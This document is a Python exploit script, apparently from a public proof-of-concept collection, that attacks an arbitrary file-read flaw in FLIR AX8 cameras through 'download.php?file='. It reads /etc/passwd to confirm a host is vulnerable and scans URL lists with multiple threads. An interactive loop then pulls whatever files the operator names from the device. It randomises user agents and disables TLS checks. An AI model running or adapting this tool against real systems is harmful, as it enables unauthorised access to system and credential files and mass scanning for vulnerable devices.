import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	url2 = url.scheme + '://' + url.netloc + '/download.php?file=/etc/passwd'
	try:
		headers = {'User-Agent': get_ua()}
		res = requests.get(url2,headers=headers,timeout=10,verify=False)
		if res.status_code == 200 and "root:" in res.text:
			print("\033[32m[+]%s is vulnerable\033[0m" %(url1))
			return 1
		else:
			print("\033[31m[-]%s is no vulnerable\033[0m" %url1)
	except Exception as e:
		print ("[-]%s is timeout\033[0m" %url1)

#cmdshell
def cmdshell(url):
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/download.php?file='
		while 1:
			files = input("\033[35mfilename: \033[0m")
			if files =="exit":
				sys.exit(0)
			else:
				headers = {'User-Agent': get_ua()}
				try:
					res = requests.get(url1 + files,headers=headers,timeout=10,verify=False)
					if res.status_code==200:
						
						print("\033[32m%s\033[0m" %res.text)
					else:
						print("\033[31m[-]%s request flase!\033[0m" %url1)

				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''
______ _     ___________        ___  __   __ _____    __ _ _                         _ 
|  ___| |   |_   _| ___ \      / _ \ \ \ / /|  _  |  / _(_) |                       | |
| |_  | |     | | | |_/ /_____/ /_\ \ \ V /  \ V /  | |_ _| | ___ _ __ ___  __ _  __| |
|  _| | |     | | |    /______|  _  | /   \  / _ \  |  _| | |/ _ \ '__/ _ \/ _` |/ _` |
| |   | |_____| |_| |\ \      | | | |/ /^\ \| |_| | | | | | |  __/ | |  __/ (_| | (_| |
\_|   \_____/\___/\_| \_|     \_| |_/\/   \/\_____/ |_| |_|_|\___|_|  \___|\__,_|\__,_|
                                                ______                                 
                                               |______|                                
                                                                                                                                          
                              					FLIR-AX8_fileread By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='FLIR-AX8_fileread By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:whoami")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)
